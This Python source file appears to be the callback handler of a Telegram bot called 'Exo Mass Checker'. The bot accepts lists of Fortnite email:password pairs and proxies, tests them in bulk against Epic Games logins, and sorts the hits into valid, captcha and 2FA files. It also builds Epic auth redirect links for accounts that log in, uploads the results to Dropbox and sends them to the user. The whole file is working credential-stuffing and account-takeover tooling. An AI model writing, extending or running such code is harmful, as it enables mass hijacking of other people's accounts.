import asyncio
import os
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from bot.keyboards import Keyboards
from bot.user_data import user_manager
from utils.file_manager import FileManager
from utils.account_checker_cf import AccountCheckerCF
from handlers.start_handler import help_command
from config import settings

from utils.dropbox_uploader import DropboxUploader
class CallbackHandler:
    @staticmethod
    async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all callback queries"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        data = query.data
        
        if data == "main_menu":
            await CallbackHandler._show_main_menu(query)
        
        elif data == "upload_proxies":
            await CallbackHandler._request_proxies_upload(query)
        
        elif data == "upload_accounts":
            await CallbackHandler._request_accounts_upload(query)
        
        elif data == "check_status":
            await CallbackHandler._show_status(query, user_id)
        
        elif data == "help":
            await CallbackHandler._show_help(query)
        
        elif data == "start_checking":
            await CallbackHandler._start_checking(query, context, user_id)
        
        elif data == "download_valid":
            await CallbackHandler._download_specific_results(query, context, user_id, "valid")
        
        elif data == "download_captcha":
            await CallbackHandler._download_specific_results(query, context, user_id, "captcha")
        
        elif data == "download_2fa":
            await CallbackHandler._download_specific_results(query, context, user_id, "2fa")
        
        elif data == "download_error":
            await CallbackHandler._download_specific_results(query, context, user_id, "error")
        
        elif data == "download_all":
            await CallbackHandler._download_all_results(query, context, user_id)
        
        elif data == "cancel_operation":
            await CallbackHandler._cancel_operation(query, user_id)
        elif data == "download_auth_links":
            await CallbackHandler._download_specific_results(query, context, user_id, "auth_links")

    
    @staticmethod
    async def _show_main_menu(query):
        """Show main menu"""
        message = """
🤖 **Exo Mass Checker - Main Menu**

Choose an option below to get started:

📁 **Upload Proxies** - Upload your proxy list
👤 **Upload Accounts** - Upload your account list
📊 **Check Status** - View current status
❓ **Help** - Get help and instructions
        """
        
        await query.edit_message_text(
            message,
            reply_markup=Keyboards.main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    
    @staticmethod
    async def _request_proxies_upload(query):
        """Request proxies file upload"""
        message = """
📁 **Upload Proxies File**

Please upload a .txt file containing your proxies.

**Supported formats:**
```
proxy1.com:8080
proxy2.com:3128
username:password@proxy3.com:8080
http://proxy4.com:8080
```

**Note:** One proxy per line. The bot will automatically detect the format.
        """
        
        await query.edit_message_text(
            message,
            reply_markup=Keyboards.back_to_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    
    @staticmethod
    async def _request_accounts_upload(query):
        """Request accounts file upload"""
        message = """
👤 **Upload Accounts File**

Please upload a .txt file containing your Fortnite accounts.

**Required format:**
```
email1@example.com:password1
email2@example.com:password2
email3@example.com:password3
```

**Note:** One account per line in email:password format.
        """
        
        await query.edit_message_text(
            message,
            reply_markup=Keyboards.back_to_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    
    @staticmethod
    async def _show_status(query, user_id: int):
        """Show current status"""
        status_message = user_manager.get_status_message(user_id)
        user_data = user_manager.get_user_data(user_id)
        
        if user_data['last_results'] and user_data.get('result_files'):
            keyboard = Keyboards.download_detailed_results()
        else:
            keyboard = Keyboards.back_to_menu()
        
        await query.edit_message_text(
            status_message,
            reply_markup=keyboard,
            parse_mode=ParseMode.MARKDOWN
        )
    
    @staticmethod
    async def _show_help(query):
        """Show help message"""
        help_message = """
📖 **Exo Mass Checker - Help Guide**

**File Formats:**

**Proxies File (.txt):**
```
proxy1.com:8080
proxy2.com:3128
username:password@proxy3.com:8080
http://proxy4.com:8080
```

**Accounts File (.txt):**
```
email1@example.com:password1
email2@example.com:password2
email3@example.com:password3
```

**How to use:**
1. Upload proxies file
2. Upload accounts file
3. Click "Start Checking"
4. Wait for completion
5. Download working accounts

**Tips:**
• Use high-quality proxies for better results
• Ensure correct file formats
• Be patient during checking process
        """
        
        await query.edit_message_text(
            help_message,
            reply_markup=Keyboards.back_to_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    
    @staticmethod
    async def _start_checking(query, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Start the account checking process"""
        if not user_manager.can_start_checking(user_id):
            await query.edit_message_text(
                "❌ Cannot start checking! Please upload an accounts file first.\n\n"
                "💡 Proxies are optional - if not uploaded, direct connection will be used.",
                reply_markup=Keyboards.main_menu()
            )
            return
        
        user_data = user_manager.get_user_data(user_id)
        user_manager.set_checking_status(user_id, True)
        
        # Show initial progress message
        progress_message = await query.edit_message_text(
            "🚀 **Starting account checking...**\n\n"
            "📊 Preparing to check accounts...\n"
            "⏳ Please wait...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        try:
            # Load files
            proxies = []
            if user_data['proxies_file']:
                proxies = await FileManager.read_proxies(user_data['proxies_file'])
                if not proxies:
                    await progress_message.edit_text(
                        "❌ No valid proxies found in uploaded file!",
                        reply_markup=Keyboards.back_to_menu()
                    )
                    user_manager.set_checking_status(user_id, False)
                    return
            
            accounts = await FileManager.read_accounts(user_data['accounts_file'])
            
            if not accounts:
                await progress_message.edit_text(
                    "❌ No valid accounts found!",
                    reply_markup=Keyboards.back_to_menu()
                )
                user_manager.set_checking_status(user_id, False)
                return
            
            # Progress callback
            last_update_time = 0
            async def progress_callback(checked, total):
                nonlocal last_update_time
                import time
                current_time = time.time()
                
                # Update every 2 seconds to avoid rate limits
                if current_time - last_update_time >= 2:
                    last_update_time = current_time
                    percentage = (checked / total) * 100
                    progress_bar = "█" * int(percentage / 5) + "░" * (20 - int(percentage / 5))
                    
                    try:
                        await progress_message.edit_text(
                            f"🔄 **Checking Accounts...**\n\n"
                            f"📊 Progress: {checked}/{total} ({percentage:.1f}%)\n"
                            f"[{progress_bar}]\n\n"
                            f"🔍 Connection: {'Direct (no proxies)' if not proxies else f'{len(proxies)} proxies'}\n"
                            f"⚡ Checking with {min(settings.MAX_CONCURRENT_CHECKS, len(accounts))} concurrent connections",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except:
                        pass  # Ignore rate limit errors
            
            # Start checking
            async with AccountCheckerCF(proxies) as checker:
                results = await checker.check_accounts_batch(
                    accounts, progress_callback
                )
            
            # Extract results
            valid_accounts = results['valid']
            invalid_accounts = results['invalid']
            captcha_accounts = results['captcha']
            twofa_accounts = results['2fa']
            error_accounts = results.get('error', [])
            
            # Save different types of accounts to separate files
            files_created = {}
            auth_links_path = None
            
            # Build and save dynamic auth links per valid/captcha/2fa accounts when possible
            try:
                auth_links = []
                for bucket in (valid_accounts, captcha_accounts, twofa_accounts):
                    for email, password, info in bucket:
                        client_id = None
                        if isinstance(info, dict):
                            acc = info.get('account_data', info)
                            client_id = acc.get('client_id') or acc.get('clientId')
                        if client_id:
                            link = f"https://www.epicgames.com/id/api/redirect?clientId={client_id}&responseType=code"
                            auth_links.append(f"{email}	{link}")
                if auth_links:
                    user_dir = os.path.join(settings.DATA_DIR, str(user_id))
                    os.makedirs(user_dir, exist_ok=True)
                    auth_links_path = os.path.join(user_dir, "auth_links.txt")
                    import aiofiles
                    async with aiofiles.open(auth_links_path, 'w', encoding='utf-8') as f:
                        await f.write("
".join(auth_links) + "
")
                    # Upload to Dropbox
                    try:
                        dropbox_path = DropboxUploader.build_dropbox_path("Results", str(user_id), "auth_links.txt")
                        await DropboxUploader.upload_file(auth_links_path, dropbox_path)
                    except Exception as e:
                        print(f"Dropbox upload error (auth_links): {e}")
            except Exception as e:
                print(f"Auth links build error: {e}")
            if valid_accounts:
                files_created['valid'] = await FileManager.save_working_accounts(valid_accounts, user_id, "valid")
            
            if captcha_accounts:
                files_created['captcha'] = await FileManager.save_working_accounts(captcha_accounts, user_id, "captcha")
            
            if twofa_accounts:
                files_created['2fa'] = await FileManager.save_working_accounts(twofa_accounts, user_id, "2fa")
            
            if error_accounts:
                files_created['error'] = await FileManager.save_working_accounts(error_accounts, user_id, "error")
            
            # Include auth links file
            if auth_links_path:
                files_created['auth_links'] = auth_links_path

            # Update user data with new results structure
            user_manager.set_detailed_results(user_id, results, files_created)
            user_manager.set_checking_status(user_id, False)
            
            # Show detailed results
            total_checked = len(valid_accounts) + len(invalid_accounts) + len(captcha_accounts) + len(twofa_accounts) + len(error_accounts)
            success_rate = (len(valid_accounts) / total_checked * 100) if total_checked > 0 else 0
            
            result_message = f"✅ **Checking Complete!**\n\n"
            result_message += f"📊 **Detailed Results:**\n"
            result_message += f"• Total checked: {total_checked}\n"
            result_message += f"• ✅ Valid accounts: {len(valid_accounts)}\n"
            result_message += f"• ❌ Invalid accounts: {len(invalid_accounts)}\n"
            result_message += f"• 🤖 Captcha required: {len(captcha_accounts)}\n"
            result_message += f"• 🔐 2FA required: {len(twofa_accounts)}\n"
            if error_accounts:
                result_message += f"• ⚠️ Errors: {len(error_accounts)}\n"
            result_message += f"• Success rate: {success_rate:.1f}%\n\n"
            
            if valid_accounts or captcha_accounts or twofa_accounts:
                result_message += "📥 Click below to download your results!"
                # Include Auth Links button if we generated the file
                include_auth = os.path.exists(os.path.join(settings.DATA_DIR, str(user_id), "auth_links.txt"))
                keyboard = Keyboards.download_detailed_results(include_auth_links=include_auth)
            else:
                result_message += "😔 No working accounts found."
                keyboard = Keyboards.back_to_menu()
            
            await progress_message.edit_text(
                result_message,
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )
            
        except Exception as e:
            user_manager.set_checking_status(user_id, False)
            await progress_message.edit_text(
                f"❌ **Error during checking:**\n\n{str(e)}",
                reply_markup=Keyboards.back_to_menu(),
                parse_mode=ParseMode.MARKDOWN
            )
    
    @staticmethod
    async def _download_specific_results(query, context: ContextTypes.DEFAULT_TYPE, user_id: int, result_type: str):
        """Send specific type of results file to user"""
        user_data = user_manager.get_user_data(user_id)
        
        if not user_data.get('result_files') or result_type not in user_data['result_files']:
            await query.edit_message_text(
                f"❌ No {result_type} accounts found!",
                reply_markup=Keyboards.back_to_menu()
            )
            return
        
        file_path = user_data['result_files'][result_type]
        if not os.path.exists(file_path):
            await query.edit_message_text(
                f"❌ {result_type.title()} accounts file not found!",
                reply_markup=Keyboards.back_to_menu()
            )
            return
        
        try:
            # Get account count for this type
            results = user_data['last_results']
            count_key = f"{result_type}_count"
            account_count = results.get(count_key, 0)
            
            # Determine emoji and description
            if result_type == "valid":
                emoji = "✅"
                description = "Valid Accounts"
            elif result_type == "captcha":
                emoji = "🤖"
                description = "Captcha Required Accounts"
            elif result_type == "2fa":
                emoji = "🔐"
                description = "2FA Required Accounts"
            elif result_type == "error":
                emoji = "⚠️"
                description = "Error Accounts"
            else:
                emoji = "📄"
                description = f"{result_type.title()} Accounts"
            
            # Send file
            with open(file_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename=f"{result_type}_accounts.txt",
                    caption=f"{emoji} **{description}**\n\n"
                           f"📊 Count: {account_count} accounts\n"
                           f"📅 Generated: {query.message.date.strftime('%Y-%m-%d %H:%M:%S')}",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            await query.edit_message_text(
                f"✅ **{description} sent successfully!**\n\n"
                f"Check the file above for your {result_type} accounts.",
                reply_markup=Keyboards.download_detailed_results(),
                parse_mode=ParseMode.MARKDOWN
            )
            
        except Exception as e:
            await query.edit_message_text(
                f"❌ Error sending {result_type} file: {str(e)}",
                reply_markup=Keyboards.back_to_menu()
            )
    
    @staticmethod
    async def _download_all_results(query, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Send all result files to user"""
        user_data = user_manager.get_user_data(user_id)
        
        if not user_data.get('result_files'):
            await query.edit_message_text(
                "❌ No result files found!",
                reply_markup=Keyboards.back_to_menu()
            )
            return
        
        try:
            files_sent = 0
            results = user_data['last_results']
            
            # Send each available file
            for result_type, file_path in user_data['result_files'].items():
                if os.path.exists(file_path):
                    count_key = f"{result_type}_count"
                    account_count = results.get(count_key, 0)
                    
                    if result_type == "valid":
                        emoji = "✅"
                        description = "Valid Accounts"
                    elif result_type == "captcha":
                        emoji = "🤖"
                        description = "Captcha Required"
                    elif result_type == "2fa":
                        emoji = "🔐"
                        description = "2FA Required"
                    elif result_type == "error":
                        emoji = "⚠️"
                        description = "Error Accounts"
                    else:
                        emoji = "📄"
                        description = f"{result_type.title()}"
                    
                    with open(file_path, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=query.message.chat_id,
                            document=f,
                            filename=f"{result_type}_accounts.txt",
                            caption=f"{emoji} **{description}**\n📊 {account_count} accounts"
                        )
                    files_sent += 1
            
            if files_sent > 0:
                await query.edit_message_text(
                    f"✅ **All result files sent successfully!**\n\n"
                    f"📦 {files_sent} files sent\n"
                    f"Check the files above for your accounts.",
                    reply_markup=Keyboards.back_to_menu(),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await query.edit_message_text(
                    "❌ No result files available to send!",
                    reply_markup=Keyboards.back_to_menu()
                )
            
        except Exception as e:
            await query.edit_message_text(
                f"❌ Error sending files: {str(e)}",
                reply_markup=Keyboards.back_to_menu()
            )
    
    @staticmethod
    async def _cancel_operation(query, user_id: int):
        """Cancel current operation"""
        user_manager.set_checking_status(user_id, False)
        await query.edit_message_text(
            "❌ **Operation cancelled.**",
            reply_markup=Keyboards.main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )